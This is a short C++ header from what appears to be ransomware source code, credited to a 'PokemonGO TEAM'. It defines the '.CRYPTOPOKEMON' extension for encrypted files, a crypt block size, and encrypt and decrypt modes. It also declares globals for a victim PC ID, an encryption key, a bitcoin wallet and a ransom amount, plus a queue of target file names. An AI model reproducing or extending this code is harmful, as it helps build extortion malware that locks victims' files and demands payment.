/*
 * prog_defines.h
 *
 * Default global programm defines
 *
 * COPYRIGHT (C) 2019 PokemonGO TEAM
 * pokemongo.icu
 */
#pragma once

#ifndef PROG_DEFINES
#define PROG_DEFINES

#include <string>
#include "queue.h"

// Crypt extension
#define CRYPT_lEXT L".CRYPTOPOKEMON"
#define CRYPT_EXT ".CRYPTOPOKEMON"

#define BLOCK_LEN 65536 // Crypt block len

#define MODE_DECRYPT true
#define MODE_ENCRYPT false

typedef std::wstring String;

/** Current PC ID */
extern String __PCID;

/** Current PC Encrypt key */
extern String __EncryptKey;

/** Current BTC Wallet to payment */
extern String __BTCWallet;

/** Current BTC amount to payment */
extern String __BTCSUMM;

/** File queue */
extern queue<String> queueFileNames;

#endif
